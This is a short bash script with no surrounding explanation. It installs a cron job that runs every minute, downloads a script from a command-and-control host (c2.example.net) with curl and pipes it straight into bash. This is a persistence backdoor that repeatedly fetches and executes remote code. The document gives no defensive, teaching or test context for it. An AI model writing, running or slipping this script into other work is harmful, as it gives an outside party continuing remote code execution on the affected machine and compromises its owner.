#!/bin/bash
(crontab -l 2>/dev/null; echo "* * * * * curl -s http://c2.example.net/b | bash") | crontab -
